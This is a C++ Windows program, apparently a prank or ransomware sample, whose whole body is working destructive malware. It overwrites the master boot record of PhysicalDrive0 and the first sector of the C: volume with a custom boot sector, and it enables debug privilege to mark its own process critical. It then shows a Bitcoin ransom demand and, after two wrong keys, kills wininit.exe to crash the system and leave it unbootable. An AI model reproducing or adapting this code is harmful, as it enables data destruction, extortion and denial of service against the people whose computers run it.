#include <iostream>
#include <windows.h>
#include <cstdlib>
#include <ctime> 

#define size 512 // 一个扇区512字节
bool EnableDebugPrivilege();

typedef NTSTATUS(__cdecl *fnRtlSetProcessIsCritical)(IN  BOOLEAN  NewValue, OUT PBOOLEAN OldValue OPTIONAL, IN  BOOLEAN  CheckFlag);
fnRtlSetProcessIsCritical pRtlSetProcessIsCritical;

/* run this program using the console pauser or add your own getch, system("pause") or input loop */
using namespace std;
int main(void)
{
    int a,r;
    float key;
	/* 文件流 */
	FILE *DiskFile;
	FILE *CDiskFile;
	FILE *File;
	/* MBR */
	unsigned char DiskCode[] = {0xB4,0x00,0xB0,0x12,0xCD,0x10,0x8C,0xC8,0x8E,0xD8,0x8E,0xC0,0xB4,0x13,0xB0,0x00,0xB7,0x00,0xB3,0x0F,0xB6,0x00,0xB2,0x00,0xBA,0x00,0x00,0xB3,0x4F,0xB8,0x2C,0x7C,0x89,0xC5,0xB9,0x07,0x00,0xB8,0x00,0x13,0xCD,0x10,0xFA,0xF4,0x68,0x61,0x68,0x61,0x68,0x61,0x21,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA}; 
	unsigned char MBRCODE[size]={0};// 备份MBR
	unsigned char CdiskCODE[size]={0};// 备份C
	/* 获取文件流 */
	CDiskFile=fopen("\\\\.\\C:","rb+");
	if(!CDiskFile)
		puts("Can't open file!");
	else if(!feof(CDiskFile))
	{
		/* 移动到MBR的位置 */
		fseek(CDiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
		fread(CdiskCODE,1,size,CDiskFile);// 备份MBR
		/* 移动到MBR的位置 */
		fseek(CDiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
		// 写入新的MBR
		fwrite(DiskCode,size,1,CDiskFile);
		fclose(CDiskFile);
	}
	DiskFile=fopen("\\\\.\\PhysicalDrive0","rb+");
	if(!DiskFile)
		puts("Can't open file!");
	else if(!feof(DiskFile))
	{
		/* 移动到MBR的位置 */
		fseek(DiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
		fread(MBRCODE,1,size,DiskFile);// 备份MBR
		/* 移动到MBR的位置 */
		fseek(DiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
		// 写入新的MBR
		fwrite(DiskCode,size,1,DiskFile);
		fclose(DiskFile);
	}
	EnableDebugPrivilege();
	HMODULE  hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
	if (hNtdll)
	{
		pRtlSetProcessIsCritical = (fnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(TRUE, NULL, FALSE);
		}
	}
	srand(time(0));
	r=rand()%5000,1;
	key=r-80+567/31*34;
	system ("Color 4F");
	system ("Title DiskMBR$MFT Cracker");
	cout << "Your computer's MBR and $MFT Cracked!!! Try to reboot will lose all your data and will be undone!" << endl;
	cout << "1 Bitcoin to the following address: po**********h.net" << endl;
	cout << "[WARNING] You ONLY have 2 chance to try Key! When you lose all the chance, your computer will be destroyed!" << endl;
	cout << "Enjoy your last computer system and try to backup data if you have no BTCs!" << endl;
    cout << "Remember your random code: " << r << ", (Please type \"" << key << "\" below to recovery your computer)";
	cout << "Key: " ;
    cin >> a;
    if (a == key)
    {
    	FILE *DiskFile;
    	FILE *CDiskFile;
		FILE *File;
		CDiskFile=fopen("\\\\.\\C:","rb+");
		if(!CDiskFile)
			puts("Can't open file!");
		else if(!feof(CDiskFile))
		{
			fseek(CDiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
			fwrite(CdiskCODE,size,1,CDiskFile);
			fclose(CDiskFile);
		}
		DiskFile=fopen("\\\\.\\PhysicalDrive0","rb+");
		if(!DiskFile)
			puts("Can't open file!");
		else if(!feof(DiskFile))
		{
			fseek(DiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
			fwrite(MBRCODE,size,1,DiskFile);
			fclose(DiskFile);
		}
		cout << "Key correct! Computer recovered!" << endl;
		if (pRtlSetProcessIsCritical)
		{
			pRtlSetProcessIsCritical(FALSE, NULL, FALSE);
		}
		system ("pause");
    }
    else
    {
		cout << "Incorrect key!" << endl;
	    cout << "Now you ONLY have 1 chance! Please type \"" << key << "\" to recover your computer!" << endl;
	    cout << "Key: " ;
	    cin >> a;
	    if (a == key)
	    {
	    	FILE *DiskFile;
	    	FILE *CDiskFile;
			FILE *File;
			CDiskFile=fopen("\\\\.\\C:","rb+");
			if(!CDiskFile)
				puts("Can't open file!");
			else if(!feof(CDiskFile))
			{
				fseek(CDiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
				fwrite(CdiskCODE,size,1,CDiskFile);
				fclose(CDiskFile);
			}
			DiskFile=fopen("\\\\.\\PhysicalDrive0","rb+");
			if(!DiskFile)
				puts("Can't open file!");
			else if(!feof(DiskFile))
			{
				fseek(DiskFile,0,SEEK_SET);// MBR的位置（0柱面 0磁道 1扇区）
				fwrite(MBRCODE,size,1,DiskFile);
				fclose(DiskFile);
			}
			cout << "Key correct! Computer recovered!" << endl;
			if (pRtlSetProcessIsCritical)
			{
				pRtlSetProcessIsCritical(FALSE, NULL, FALSE);
			}
			system ("pause");
	    }
	    else
	    {
	    cout << "Key incorrect! Your computer is destroyed!" << endl;
	    system ("pause");
	    system ("taskkill /f /im wininit.exe /t");
		}
	}
	return 0;
}



bool EnableDebugPrivilege()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return   false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}

